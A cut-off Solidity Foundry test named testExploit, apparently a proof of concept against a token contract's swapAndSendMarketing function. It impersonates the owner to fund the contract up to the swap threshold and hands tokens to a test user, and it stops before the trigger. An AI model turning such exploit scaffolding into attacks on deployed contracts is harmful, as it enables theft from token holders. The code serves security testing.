    function testExploit() public {

        uint256 initialBalance = address(TARGET).balance;
        console.log("Initial ETH balance:", initialBalance);

        uint256 swapThreshold = target.swapTokensAtAmount();
        console.log("Swap threshold:", swapThreshold);

        address pair = target.uniswapV2Pair();
        console.log("Pair:", pair);

        uint256 contractBalance = target.balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // Accumulate tokens if needed
        if (contractBalance < swapThreshold) {
            uint256 needed = swapThreshold - contractBalance;
            uint256 toTransfer = needed * 100 / 2; // Account for 2% marketing fee

            address owner = target.owner();
            vm.startPrank(owner);
            target.transfer(TARGET, toTransfer);
            vm.stopPrank();

            contractBalance = target.balanceOf(TARGET);
            console.log("Contract token balance after funding:", contractBalance);
        }

        // Trigger swapAndSendMarketing by transferring to pair
        if (contractBalance >= swapThreshold) {
            address user = address(0x1234567890123456789012345678901234567890);

            // Give user tokens
            address owner = target.owner();
            vm.startPrank(owner);
            target.transfer(user, swapThreshold * 2);
            vm.stopPrank();

